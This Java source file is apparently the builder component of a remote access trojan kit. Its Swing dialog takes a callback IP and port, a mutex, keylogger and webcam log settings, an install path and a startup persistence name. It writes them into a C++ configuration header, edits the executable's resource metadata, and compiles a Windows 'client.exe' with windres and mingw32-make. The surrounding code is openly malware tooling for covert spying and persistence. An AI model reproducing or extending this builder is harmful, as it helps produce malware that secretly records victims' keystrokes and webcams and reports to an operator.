package Builder;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import java.nio.file.Path;
import java.util.concurrent.atomic.AtomicReference;

public class Compiler implements ActionListener {

    private final JDialog compilerDialog;
    private final JCheckBox[] checkBoxes;
    private final JTextField[] fieldsArray;
    private final ButtonGroup buttonGroup;

    public static Path localClientFiles;

    private Path assemblyPath;

    public Compiler(JDialog compilerDialog, JCheckBox[] checkBoxesArray, JTextField[] fieldsArray, ButtonGroup buttonGroup) {
        this.compilerDialog = compilerDialog;
        this.checkBoxes = checkBoxesArray;
        this.fieldsArray = fieldsArray;
        this.buttonGroup = buttonGroup;
        assemblyPath = Path.of(localClientFiles.toString() ,"compile_configuration");

    }




    public void generateConfigurationFile(CompileInformation compileInformation) {
        String pragmaOnce = "#pragma once\n";
        String IP = pragmaOnce + "#define IP \"" + compileInformation.IP() + "\"\n";
        String PORT = "#define PORT " + compileInformation.PORT() + "\n";
        String TAG_NAME = "#define TAG_NAME \"" + compileInformation.TAG_name() + "\"\n";
        String MUTEX = "#define MUTEX \"" + compileInformation.MUTEX() + "\"\n";
        String TIMING_RETRY = "#define TIMING_RETRY " + compileInformation.TIMING_RETRY() + "\n";
        String WEBCAM = "#define WEBCAM \"" + compileInformation.WEBCAM_LOGS() + "\"\n";
        String KEYLOGGER = "#define KEYLOGGER_DEF \"" + compileInformation.KEYLOGGER_LOGS() + "\"\n";
        String INSTALL_PATH = "#define INSTALL_PATH " + compileInformation.INSTALL_PATH() + "\n";
        String SUBDIRECTORY_NAME = "#define SUBDIRECTORY_NAME \"" + compileInformation.SUBDIRECTORY_NAME() + "\"\n";
        String SUBDIRECTORY_FILE_NAME = "#define SUBDIRECTORY_FILE_NAME \"" + compileInformation.SUBDIRECTORY_FILE_NAME() + "\"\n";
        String STARTUP_NAME = "#define STARTUP_NAME \"" + compileInformation.STARTUP_NAME() + "\"\n";

        String configurationContent = pragmaOnce + IP + PORT + TAG_NAME + MUTEX + TIMING_RETRY + WEBCAM +
                KEYLOGGER + INSTALL_PATH + SUBDIRECTORY_NAME +
                SUBDIRECTORY_FILE_NAME + STARTUP_NAME;

        Path path = Path.of(localClientFiles.toString(), "includes\\configuration.h");
        try (FileWriter fileWriter = new FileWriter(path.toFile())) {
            fileWriter.write(configurationContent);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Creating command line for compiling with g++, several options to include on the client
    @Override
    public void actionPerformed(ActionEvent e) {
        // File chooser where to save file
        JFileChooser chooser = new JFileChooser();
        chooser.setFileFilter(new FileNameExtensionFilter(".exe", "."));
        chooser.setCurrentDirectory(new File(System.getProperty("user.dir")));
        chooser.setSelectedFile(new File("client"));
        chooser.setAcceptAllFileFilterUsed(false);
        int returnVal = chooser.showSaveDialog(compilerDialog);
        if (returnVal == JFileChooser.APPROVE_OPTION) {
            setAssemblySettings();
            // Set IP
            String IP = fieldsArray[0].getText();
            int PORT = Integer.parseInt(fieldsArray[1].getText());
            String TAG_name = fieldsArray[2].getText();
            String MUTEX = fieldsArray[3].getText();
            int TIMING_RETRY = Integer.parseInt(fieldsArray[4].getText());
            String WEBCAM_LOGS = fieldsArray[9].getText(); // Assuming this is the correct field
            String KEYLOGGER_LOGS = fieldsArray[10].getText(); // Assuming this is the correct field
            String INSTALL_PATH = checkBoxes[0].isSelected() ? buttonGroup.getSelection().getActionCommand() : "-1";
            String SUBDIRECTORY_NAME = fieldsArray[6].getText();
            String SUBDIRECTORY_FILE_NAME = fieldsArray[7].getText() + ".exe";
            String STARTUP_NAME = checkBoxes[1].isSelected() ? fieldsArray[8].getText() : "";

            CompileInformation compileInformation = new CompileInformation(IP, PORT, TAG_name, MUTEX, TIMING_RETRY, WEBCAM_LOGS, KEYLOGGER_LOGS,
                    Integer.parseInt(INSTALL_PATH), SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);

            generateConfigurationFile(compileInformation);

            // Create command line
            String utilities = fieldsArray[5].getText();
            String pathOfUtilities = "";
            if (!utilities.equals("g++ / windres")) pathOfUtilities = utilities;
            String assemblyCommand = Path.of(pathOfUtilities, "windres") + " assembly.rc compiled_assembly.opc";
            compile("mingw32-make", assemblyCommand);
        }

    }

    // Thread for compiling the project opening shell in client project directory
    private void compile(String compileCommand, String assemblyCommand) {
        new Thread(() -> {
            AtomicReference<CompilingAnimation> animationDialog = new AtomicReference<>();
            SwingUtilities.invokeLater(() -> animationDialog.set(new CompilingAnimation(compilerDialog)));
            String[] OSCommand = VersionChecker.getOSProperCommand();
            ProcessBuilder assemblyProcess = new ProcessBuilder();
            assemblyProcess.command(OSCommand[0], OSCommand[1], assemblyCommand).directory(assemblyPath.toFile());
            int result = executeProcess(assemblyProcess);
            if (result != 0) {
                SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(compilerDialog,
                        "Error assembling client, check for windres and try again.",
                        "Error assembling", JOptionPane.ERROR_MESSAGE));
            }
            ProcessBuilder compileProcess = new ProcessBuilder();
            compileProcess.command(OSCommand[0], OSCommand[1], compileCommand).directory(localClientFiles.toFile());
            result = executeProcess(compileProcess);
            if (result != 0) {
                SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(compilerDialog,
                        "Error compiling client, check your compiler and try again.",
                        "Error compiling", JOptionPane.ERROR_MESSAGE));

            } else SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(
                    compilerDialog,
                    "Server.Client compiled successfully!",
                    "Compiler information",
                    JOptionPane.INFORMATION_MESSAGE));
            SwingUtilities.invokeLater(() -> animationDialog.get().dispose());

        }).start();

    }

    private int executeProcess(ProcessBuilder processBuilder) {
        try {
            Process process = processBuilder.start();
            return process.waitFor();

        } catch (IOException | InterruptedException ex) {
            ex.printStackTrace();
        }
        return -1;

    }

    private void setAssemblySettings(){
        CPPModifier modifier = new CPPModifier(Path.of(assemblyPath.toString(), "assembly.rc").toString());
        modifier.modifyAssemblySettings(
                fieldsArray[11].getText(),
                fieldsArray[12].getText(),
                fieldsArray[13].getText(),
                fieldsArray[14].getText(),
                fieldsArray[15].getText(),
                fieldsArray[16].getText());
        modifier.writeToFile();
    }



}
